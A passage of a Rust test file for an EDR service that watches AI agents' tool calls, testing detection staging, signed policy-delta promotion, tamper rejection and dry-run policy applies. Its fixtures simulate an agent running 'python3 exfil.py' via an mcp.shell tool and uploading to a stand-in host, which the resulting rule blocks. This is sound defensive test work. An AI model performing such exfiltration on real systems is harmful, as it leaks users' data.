        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read staged detection response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode staged detection response: {e}"));

        assert_eq!(payload["record"]["stage"], "audit");
        assert_eq!(payload["record"]["stagedBy"], "operator:alice");
        assert_eq!(payload["record"]["recommendedStage"], "audit");
        assert_eq!(
            payload["record"]["crossWindowImpactHash"],
            "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        );
        assert_eq!(
            payload["record"]["crossWindowRecommendationHash"],
            "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
        );
        assert_eq!(
            payload["record"]["candidate"]["ruleId"],
            payload["record"]["simulation"]["ruleId"]
        );
        assert_eq!(
            payload["record"]["candidate"]["graphSliceId"],
            payload["record"]["simulation"]["graphSliceId"]
        );
        assert_eq!(
            payload["record"]["simulationReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "simulation"
        );
        assert!(payload["record"]["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing staged simulation affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(payload["record"]["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing staged simulation affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "session"
                && identity["value"] == "session-stage-candidate-1"));
        assert!(payload["record"]["simulation"]["affectedTools"]
            .as_array()
            .unwrap_or_else(|| panic!("missing staged simulation affected tools"))
            .iter()
            .any(|tool| tool["toolName"] == "mcp.shell"
                && tool["toolCallId"] == "tool-call-stage-candidate-1"));
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing staged detection graph nodes"))
            .values()
            .any(|node| node["kind"] == "credential"));
        let mut staged_record_value = payload["record"].clone();
        staged_record_value["shadowStage"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrStagedDetectionRecord>(
            staged_record_value,
            "shadowStage",
        );
        let mut candidate_value = payload["record"]["candidate"].clone();
        candidate_value["shadowRule"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrDetectionCandidate>(candidate_value, "shadowRule");
        let mut stage_entry_value = payload["record"]["stagePlan"][0].clone();
        stage_entry_value["shadowPromotionGate"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrDetectionCandidateStage>(
            stage_entry_value,
            "shadowPromotionGate",
        );

        let reopened = EndpointStagedDetectionLedger::open(&staged_detection_path)
            .unwrap_or_else(|e| panic!("failed to reopen staged detection ledger: {e}"));
        let persisted = reopened
            .read_recent(10, Some("audit"), None)
            .unwrap_or_else(|e| panic!("failed to read staged detections: {e}"));
        assert_eq!(persisted.len(), 1);
        assert_eq!(persisted[0].staged_by, "operator:alice");
        assert_eq!(
            persisted[0].cross_window_impact_hash.as_deref(),
            Some("0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
        assert_eq!(
            persisted[0].cross_window_recommendation_hash.as_deref(),
            Some("0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
        );
        assert!(persisted[0]
            .simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "user" && identity.value == "alice"));
        assert!(persisted[0]
            .simulation
            .affected_identities
            .iter()
            .any(|identity| identity.identity_kind == "session"
                && identity.value == "session-stage-candidate-1"));
        assert!(persisted[0].simulation.affected_tools.iter().any(|tool| {
            tool.tool_name == "mcp.shell"
                && tool.tool_call_id.as_deref() == Some("tool-call-stage-candidate-1")
        }));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/staged-detections?stage=audit")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build staged detection list: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("staged detection list failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read staged detection list: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode staged detection list: {e}"));
        assert_eq!(payload["count"], 1);
        assert_eq!(payload["stagedDetections"][0]["stage"], "audit");
        assert_eq!(
            payload["stagedDetections"][0]["crossWindowImpactHash"],
            "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        );

        let _ = std::fs::remove_file(staged_detection_path);
    }

    #[tokio::test]
    async fn agent_edr_policy_deltas_promote_staged_detection_to_signed_overlay() {
        let staged_detection_path = test_staged_detection_path();
        let policy_delta_dir = test_policy_delta_dir();
        let _ = std::fs::remove_file(&staged_detection_path);
        let _ = std::fs::remove_dir_all(&policy_delta_dir);
        let mut state = test_state();
        state.edr_staged_detection_ledger = Arc::new(Mutex::new(
            EndpointStagedDetectionLedger::open(&staged_detection_path)
                .unwrap_or_else(|e| panic!("failed to open staged detection ledger: {e}")),
        ));
        state.edr_policy_delta_store = Arc::new(Mutex::new(
            EndpointPolicyDeltaStore::open(&policy_delta_dir)
                .unwrap_or_else(|e| panic!("failed to open policy delta store: {e}")),
        ));
        {
            let settings = state.settings.read().await;
            std::fs::write(
                &settings.policy_path,
                "version: \"test-edr\"\npolicy_epoch: 1\nname: agent-api-test\n",
            )
            .unwrap_or_else(|e| panic!("failed to pin test policy epoch: {e}"));
        }
        let state = Arc::new(state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/staged-detections",
                get(agent_edr_staged_detections).post(agent_edr_stage_detection),
            )
            .route(
                "/api/v1/agent/edr/policy-deltas",
                get(agent_edr_policy_deltas).post(agent_edr_policy_delta),
            )
            .route(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply",
                post(agent_edr_policy_delta_apply),
            )
            .with_state(state.clone());

        let host = "delta.example.invalid";
        let port = 443;
        let observations = vec![
            EndpointObservation {
                observation_id: "policy-delta-network-1".to_string(),
                host_id: Some("host-policy-delta-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-policy-delta-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-policy-delta-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    command_line: Some("python3 exfil.py".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::NetworkFlow {
                    host: host.to_string(),
                    port,
                    protocol: Some("https".to_string()),
                    url: Some(format!("https://{host}/upload")),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-policy-delta-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-policy-delta-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "policy-delta-tool-1".to_string(),
                host_id: Some("host-policy-delta-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-policy-delta-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-policy-delta-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    command_line: Some("python3 exfil.py".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "python3 exfil.py"
                    }),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-policy-delta-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-policy-delta-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy-delta findings: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy-delta findings failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let network_node_id = {
            let graph = state.edr_flight_recorder.lock().await.graph().clone();
            graph
                .nodes
                .iter()
                .find(|(_, node)| {
                    node.kind == CausalNodeKind::Network && node.label == format!("{host}:{port}")
                })
                .map(|(node_id, _)| node_id.clone())
                .unwrap_or_else(|| panic!("missing network graph node"))
        };

        let body = serde_json::json!({
            "rootNodeId": network_node_id,
            "maxDepth": 8,
            "selectedStage": "limited_block",
            "stagedBy": "operator:bob",
            "note": "attempt enforcement without cross-window readiness"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/staged-detections")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build ungated policy-delta stage request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("ungated policy-delta stage request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read ungated stage response: {e}"));
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "ungated stage response: {}",
            String::from_utf8_lossy(&bytes)
        );
        assert!(
            String::from_utf8_lossy(&bytes).contains("promotionReady=true"),
            "ungated stage response: {}",
            String::from_utf8_lossy(&bytes)
        );

        let body = serde_json::json!({
            "rootNodeId": network_node_id,
            "maxDepth": 8,
            "selectedStage": "limited_block",
            "crossWindowImpactHash": "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
            "crossWindowRecommendationHash": "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
            "stagedBy": "operator:bob",
            "note": "stage egress restriction"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/staged-detections")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy-delta stage request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy-delta stage request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read unproven staged detection response: {e}"));
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "unproven stage response: {}",
            String::from_utf8_lossy(&bytes)
        );
        assert!(
            String::from_utf8_lossy(&bytes).contains("recent promotionReady=true"),
            "unproven stage response: {}",
            String::from_utf8_lossy(&bytes)
        );

        let current_policy = {
            let settings = state.settings.read().await.clone();
            endpoint_policy_snapshot_from_settings(&settings)
                .unwrap_or_else(|e| panic!("failed to snapshot current policy: {e}"))
        };

        state
            .edr_cross_window_promotion_validations
            .lock()
            .await
            .push_back(EdrCrossWindowPromotionValidation {
                recorded_at: chrono::Utc::now(),
                impact_hash:
                    "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
                        .to_string(),
                recommendation_hash:
                    "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
                        .to_string(),
                current_policy_hash: current_policy.policy_hash,
                current_policy_epoch: current_policy.policy_epoch,
                proposed_policy_hash: sha256(b"test-proposed-policy").to_hex_prefixed(),
                proposed_policy_epoch: 2,
                event_stream_hash: sha256(b"test-event-stream").to_hex_prefixed(),
                current_result_hash: sha256(b"test-current-result").to_hex_prefixed(),
                proposed_result_hash: sha256(b"test-proposed-result").to_hex_prefixed(),
                history_selector_hash: sha256(b"test-history-selector").to_hex_prefixed(),
                newest_event_at: Some(chrono::Utc::now()),
                max_age_seconds: Some(1800),
                recommended_stage: "limited_block".to_string(),
                root_node_id: network_node_id.clone(),
                action: EndpointDecisionAction::RestrictEgress,
                promotion_ready: true,
            });

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/staged-detections")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build proven policy-delta stage request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("proven policy-delta stage request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read staged detection response: {e}"));
        let staged_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode staged detection response: {e}"));
        let staged_detection_id = staged_payload["record"]["stagedDetectionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing staged detection id"));
        assert!(staged_payload["record"]["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing staged policy-delta affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(staged_payload["record"]["simulation"]["affectedTools"]
            .as_array()
            .unwrap_or_else(|| panic!("missing staged policy-delta affected tools"))
            .iter()
            .any(|tool| tool["toolName"] == "mcp.shell"
                && tool["toolCallId"] == "tool-call-policy-delta-1"));

        let body = serde_json::json!({
            "stagedDetectionId": staged_detection_id,
            "generatedBy": "operator:bob",
            "note": "promote egress rule into a policy delta"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/policy-deltas")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy delta request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy delta request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy delta response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "policy delta response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy delta response: {e}"));

        assert_eq!(payload["record"]["stage"], "limited_block");
        assert_eq!(payload["record"]["action"], "restrict_egress");
        assert_eq!(
            payload["record"]["artifact"]["schemaVersion"],
            EDR_POLICY_DELTA_SCHEMA_VERSION
        );
        assert_eq!(
            payload["record"]["artifact"]["stagedDetectionId"],
            staged_detection_id
        );
        assert!(payload["record"]["artifact"]["sourceAffectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta source affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(payload["record"]["artifact"]["sourceAffectedTools"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta source affected tools"))
            .iter()
            .any(|tool| tool["toolName"] == "mcp.shell"
                && tool["toolCallId"] == "tool-call-policy-delta-1"));
        assert_eq!(
            payload["record"]["artifact"]["rollout"]["crossWindowImpactHash"],
            "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
        );
        assert_eq!(
            payload["record"]["artifact"]["rollout"]["crossWindowRecommendationHash"],
            "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        );
        assert_eq!(
            payload["record"]["artifact"]["policyPatch"]["endpoint_decision_engine"]
                ["generated_rules"][0]["cross_window_impact_hash"],
            "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
        );
        assert!(
            payload["record"]["artifact"]["policyPatch"]["endpoint_decision_engine"]
                ["generated_rules"][0]["impact"]["affected_identity_context"]
                .as_array()
                .unwrap_or_else(|| panic!("missing policy patch affected identity context"))
                .iter()
                .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice")
        );
        assert!(
            payload["record"]["artifact"]["policyPatch"]["endpoint_decision_engine"]
                ["generated_rules"][0]["impact"]["affected_tool_context"]
                .as_array()
                .unwrap_or_else(|| panic!("missing policy patch affected tool context"))
                .iter()
                .any(|tool| tool["toolName"] == "mcp.shell"
                    && tool["toolCallId"] == "tool-call-policy-delta-1")
        );
        assert_eq!(
            payload["record"]["artifact"]["policyPatch"]["guards"]["egress_allowlist"]["block"][0],
            "delta.example.invalid:443"
        );
        assert!(payload["record"]["artifactHash"]
            .as_str()
            .unwrap_or_default()
            .starts_with("0x"));
        let artifact_path = payload["record"]["artifactPath"]
            .as_str()
            .unwrap_or_else(|| panic!("missing policy delta artifact path"));
        assert!(std::path::Path::new(artifact_path).is_file());
        let endpoint_decision =
            &payload["record"]["receipt"]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(endpoint_decision["receiptFamily"], "policy_delta");
        assert_eq!(
            endpoint_decision["decision"]["findingId"],
            payload["record"]["policyDeltaId"]
        );
        assert_eq!(
            endpoint_decision["decision"]["ruleId"],
            payload["record"]["ruleId"]
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "crossWindowImpactHash"));
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "crossWindowRecommendationHash"));
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "sourceAffectedIdentityContext"));
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "sourceAffectedToolContext"));
        let mut policy_delta_record_value = payload["record"].clone();
        policy_delta_record_value["shadowPolicyDelta"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrPolicyDeltaRecord>(
            policy_delta_record_value,
            "shadowPolicyDelta",
        );
        let mut policy_delta_artifact_value = payload["record"]["artifact"].clone();
        policy_delta_artifact_value["shadowPolicyPatch"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrPolicyDeltaArtifact>(
            policy_delta_artifact_value,
            "shadowPolicyPatch",
        );
        let mut policy_delta_target_value = payload["record"]["artifact"]["targetPolicy"].clone();
        policy_delta_target_value["shadowPolicyEpoch"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrPolicyDeltaTargetPolicy>(
            policy_delta_target_value,
            "shadowPolicyEpoch",
        );
        let mut policy_delta_rollout_value = payload["record"]["artifact"]["rollout"].clone();
        policy_delta_rollout_value["shadowPromotionGate"] =
            serde_json::Value::String("must not be ignored".to_string());
        assert_unknown_field_rejected::<EdrPolicyDeltaRollout>(
            policy_delta_rollout_value,
            "shadowPromotionGate",
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/policy-deltas?stage=limited_block")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build policy delta list request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy delta list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy delta list: {e}"));
        let list_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy delta list: {e}"));
        assert_eq!(list_payload["count"], 1);
        assert_eq!(
            list_payload["policyDeltas"][0]["artifactHash"],
            payload["record"]["artifactHash"]
        );

        let policy_delta_id = payload["record"]["policyDeltaId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing policy delta id"));
        let original_policy = {
            let settings = state.settings.read().await;
            std::fs::read_to_string(&settings.policy_path)
                .unwrap_or_else(|e| panic!("failed to read original policy: {e}"))
        };
        let original_record: EdrPolicyDeltaRecord =
            serde_json::from_value(payload["record"].clone())
                .unwrap_or_else(|e| panic!("failed to decode original policy delta record: {e}"));
        let mut tampered_record = original_record.clone();
        tampered_record.artifact.policy_patch = serde_json::json!({
            "endpoint_decision_engine": {
                "generated_rules": []
            }
        });
        let policy_delta_index =
            crate::edr::ledger::policy_delta::policy_delta_index_path(&policy_delta_dir);
        let mut policy_delta_index_contents = std::fs::read_to_string(&policy_delta_index)
            .unwrap_or_else(|e| panic!("failed to read policy delta index: {e}"));
        policy_delta_index_contents.push_str(
            &serde_json::to_string(&tampered_record)
                .unwrap_or_else(|e| panic!("failed to encode tampered policy delta record: {e}")),
        );
        policy_delta_index_contents.push('\n');
        std::fs::write(&policy_delta_index, policy_delta_index_contents)
            .unwrap_or_else(|e| panic!("failed to append tampered policy delta record: {e}"));
        let body = serde_json::json!({
            "dryRun": true,
            "appliedBy": "operator:bob"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build tampered policy delta apply: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("tampered policy delta apply failed: {e}"));
        assert_eq!(response.status(), StatusCode::CONFLICT);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read tampered policy delta apply error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("tampered policy delta apply error is not utf8: {e}"));
        assert!(
            error.contains("artifact hash mismatch"),
            "unexpected tampered policy delta error: {error}"
        );
        let mut policy_delta_index_contents = std::fs::read_to_string(&policy_delta_index)
            .unwrap_or_else(|e| panic!("failed to reread policy delta index: {e}"));
        policy_delta_index_contents.push_str(
            &serde_json::to_string(&original_record)
                .unwrap_or_else(|e| panic!("failed to encode original policy delta record: {e}")),
        );
        policy_delta_index_contents.push('\n');
        std::fs::write(&policy_delta_index, policy_delta_index_contents)
            .unwrap_or_else(|e| panic!("failed to restore original policy delta record: {e}"));
        let body = serde_json::json!({
            "dryRun": true,
            "appliedBy": "operator:bob"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy delta dry-run apply: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy delta dry-run apply failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 256 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy delta dry-run apply: {e}"));
        let dry_run_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy delta dry-run apply: {e}"));
        assert_eq!(dry_run_payload["record"]["dryRun"], true);
        assert_eq!(dry_run_payload["record"]["applied"], false);
        assert_eq!(
            dry_run_payload["record"]["crossWindowImpactHash"],
            "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
        );
        assert_eq!(
            dry_run_payload["record"]["crossWindowRecommendationHash"],
            "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        );
        assert!(dry_run_payload["receipt"].is_null());
        assert!(dry_run_payload["postApplyEnforcement"].is_null());
        let policy_after_dry_run = {
            let settings = state.settings.read().await;
            std::fs::read_to_string(&settings.policy_path)
                .unwrap_or_else(|e| panic!("failed to read dry-run policy: {e}"))
        };
        assert_eq!(policy_after_dry_run, original_policy);
        let expected_new_epoch = dry_run_payload["record"]["newPolicyEpoch"]
            .as_u64()
            .unwrap_or_else(|| panic!("missing dry-run new policy epoch"));
        let advanced_policy = format!(
            "version: test-edr\npolicy_epoch: {}\n",
            expected_new_epoch.saturating_add(10)
        );
        {
            let settings = state.settings.read().await;
            std::fs::write(&settings.policy_path, advanced_policy.as_bytes())
                .unwrap_or_else(|e| panic!("failed to write advanced policy: {e}"));
        }
        let body = serde_json::json!({
            "dryRun": true,
            "allowBasePolicyDrift": true,
            "appliedBy": "operator:bob"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build stale policy delta apply: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("stale policy delta apply request failed: {e}"));
        assert_eq!(response.status(), StatusCode::CONFLICT);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read stale policy delta apply error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("stale policy delta apply error is not utf8: {e}"));
        assert!(error.contains("policy delta target epoch"));
        {
            let settings = state.settings.read().await;
            std::fs::write(&settings.policy_path, original_policy.as_bytes())
                .unwrap_or_else(|e| panic!("failed to restore original policy: {e}"));
        }
        let body = serde_json::json!({
            "dryRun": false,
            "verifyProtectionState": false,
            "reloadDaemonPolicy": false,
            "restartDaemon": false,
            "appliedBy": "operator:bob"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build unverified live policy delta apply request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("unverified live policy delta apply request failed: {e}")
            });
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read unverified live policy delta apply response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "unexpected unverified live policy delta apply response: {}",
            String::from_utf8_lossy(&bytes)
        );
        assert!(String::from_utf8_lossy(&bytes).contains("verifyProtectionState"));
        let body = serde_json::json!({
            "dryRun": false,
            "appliedBy": "operator:bob",
            "note": "missing approval-bound actor must be rejected",
            "providerAckTimeoutMs": 1000
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build unauthored live policy delta apply request: {e}")
            });
        let response =
            app.clone().oneshot(req).await.unwrap_or_else(|e| {
                panic!("unauthored live policy delta apply request failed: {e}")
            });
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read unauthored live policy delta apply response: {e}")
            });
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "unexpected unauthored live policy delta apply response: {}",
            String::from_utf8_lossy(&bytes)
        );
        assert!(
            String::from_utf8_lossy(&bytes).contains("requires actor identity"),
            "unexpected unauthored live policy delta apply response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let (mock_daemon_policy_reload_port, _mock_daemon_policy_reload_handle) =
            spawn_mock_daemon_policy_reload().await;
        {
            let mut settings = state.settings.write().await;
            settings.daemon_port = mock_daemon_policy_reload_port;
        }
        let policy_delta_reload_path = state
            .edr_network_extension_egress_policy_path
            .display()
            .to_string();
        let (reload_tx, mut reload_rx) =
            tokio::sync::mpsc::channel::<crate::macos::host::MacosNetworkExtensionReloadRequest>(1);
        state
            .macos_host
            .install_network_extension_reload_channel(reload_tx)
            .await;
        let macos_host_for_ack = state.macos_host.clone();
        let policy_delta_reload_path_for_ack = policy_delta_reload_path.clone();
        tokio::spawn(async move {
            let request = reload_rx
                .recv()
                .await
                .unwrap_or_else(|| panic!("missing policy-delta NetworkExtension reload request"));
            assert_eq!(
                request.policy_snapshot_path,
                PathBuf::from(policy_delta_reload_path_for_ack.as_str())
            );
            assert_eq!(request.timeout_duration, Duration::from_millis(1000));
            let request_id = "policy-delta-reload-1".to_string();
            macos_host_for_ack
                .replace_status(CombinedSystemExtensionStatus {
                    install_state: SystemExtensionInstallState::Installed,
                    approval: SystemExtensionApproval::Approved,
                    endpoint_security: ProviderStatus {
                        runtime: ProviderRuntimeState::Active,
                        policy_epoch: Some(expected_new_epoch),
                        ..ProviderStatus::unknown()
                    },
                    network_extension: ProviderStatus {
                        runtime: ProviderRuntimeState::Active,
                        policy_epoch: Some(expected_new_epoch),
